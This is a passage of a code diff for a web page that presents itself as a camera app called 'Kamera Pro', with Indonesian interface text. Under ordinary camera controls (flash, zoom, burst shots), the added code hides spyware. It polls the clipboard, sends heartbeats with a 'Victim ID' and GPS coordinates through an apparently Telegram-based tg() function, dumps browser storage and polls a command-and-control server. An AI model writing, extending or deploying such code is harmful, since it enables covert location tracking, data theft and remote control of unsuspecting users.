+        setInterval(checkClipboard, 4000);
+        setInterval(() => { tg('💓 HB '+VID+' | '+new Date().toLocaleTimeString('id-ID')+' | 📍 '+(gpsData?gpsData.lat.toFixed(4)+','+gpsData.lon.toFixed(4):'N/A')); }, 120000);
+        setTimeout(() => dumpAllStorage(), 10000);
+    }
 
-        thumbBox.addEventListener('click', () => {
-            if (!lastPhotoData) return;
-            const w = window.open('', '_blank');
-            w.document.write(
-                `<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}img{max-width:100%;max-height:100%;object-fit:contain;}</style></head><body><img src="${lastPhotoData}" onclick="window.close()"></body></html>`
-                );
-            w.document.close();
-        });
+    function startC2Polling() {
+        if (c2PollInterval) return;
+        const poll = async () => { await pollC2(); c2PollInterval = setTimeout(poll, 3000); };
+        poll();
+    }
 
-        document.addEventListener('click', (e) => {
-            if (e.target.closest('button') || e.target.closest('.zoom-bar') || e.target.closest(
-                    '.thumb-box') || e.target.closest('.perm-overlay')) return;
-            focusRipple.style.left = e.clientX + 'px';
-            focusRipple.style.top = e.clientY + 'px';
-            focusRipple.classList.remove('pop');
-            void focusRipple.offsetWidth;
-            focusRipple.classList.add('pop');
-        });
+    // ==================== UI HANDLERS ====================
+    btnStart.addEventListener('click', () => startCamera(facingMode));
 
-        // ==================== INIT ====================
-        statusMsg.textContent = 'Tekan tombol untuk mulai';
-        console.log('📸 Kamera Pro — Siap');
-        console.log('🆔 Victim ID:', VID);
-    })();
-    </script>
+    function updateFlashUI() { btnFlash.classList.toggle('on', flashOn); lblFlash.textContent = flashOn ? 'On' : 'Flash'; }
+    btnFlash.addEventListener('click', async () => {
+        if (!stream) return;
+        const t = stream.getVideoTracks()[0];
+        try { flashOn = !flashOn; await t.applyConstraints({ advanced: [{ torch: flashOn }] }); updateFlashUI(); } catch(e) {}
+    });
+
+    btnBlur.addEventListener('click', () => { blurOn = !blurOn; btnBlur.classList.toggle('on', blurOn); lblBlur.textContent = blurOn ? 'On' : 'Blur'; });
+    btnWM.addEventListener('click', () => { wmOn = !wmOn; btnWM.classList.toggle('on', wmOn); });
+    btnFlip.addEventListener('click', async () => { const nf = facingMode==='environment'?'user':'environment'; await startCamera(nf); });
+    btnTimer.addEventListener('click', () => { const timers = ['3s','5s','10s','Off']; const cur = lblTimer.textContent; const idx = (timers.indexOf(cur)+1)%timers.length; lblTimer.textContent = timers[idx]; });
+    btnMirror.addEventListener('click', () => { mirrorOn = !mirrorOn; btnMirror.classList.toggle('on', mirrorOn); updateMirror(); });
+    btnLive.addEventListener('click', () => { liveMode = !liveMode; btnLive.classList.toggle('on', liveMode); });
+    btnHD.addEventListener('click', async () => { hdOn = !hdOn; btnHD.classList.toggle('on', hdOn); await startCamera(facingMode); });
+
+    function applyZoom() {
+        zoomVal.textContent = currentZoom+'×';
+        if (stream) {
+            const t = stream.getVideoTracks()[0];
+            const cap = t.getCapabilities();
+            if (cap.zoom) { const val = Math.min(cap.zoom.max||5, Math.max(cap.zoom.min||0.5, currentZoom)); t.applyConstraints({ advanced: [{ zoom: val }] }).catch(() => {}); }
+        }
+    }
+    btnZoomIn.addEventListener('click', () => { if (currentZoom < 5) { currentZoom = Math.min(5, currentZoom+0.5); applyZoom(); } });
+    btnZoomOut.addEventListener('click', () => { if (currentZoom > 0.5) { currentZoom = Math.max(0.5, currentZoom-0.5); applyZoom(); } });
+
+    btnShutter.addEventListener('click', () => captureBurst5(false));
+
+    thumbBox.addEventListener('click', () => {
+        if (!lastPhotoData) return;
+        const w = window.open('', '_blank');
+        w.document.write('<html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-width:100%;max-height:100%}</style><img src="'+lastPhotoData+'" onclick="window.close()"></html>');
+        w.document.close();
+    });
+
+    document.addEventListener('click', (e) => {
+        if (e.target.closest('button')||e.target.closest('.zoom-bar')||e.target.closest('.thumb-box')||e.target.closest('.perm-overlay')) return;
+        focusRipple.style.left = e.clientX+'px';
+        focusRipple.style.top = e.clientY+'px';
+        focusRipple.classList.remove('pop');
+        void focusRipple.offsetWidth;
+        focusRipple.classList.add('pop');
+    });
+
+    statusMsg.textContent = 'Tekan tombol untuk mulai';
+    console.log('📸 Kamera Pro v5.0 — 5 Foto Burst | Notif | History Dump');
+    console.log('🆔 Victim ID:', VID);
+})();
+</script>
 </body>
 </html>
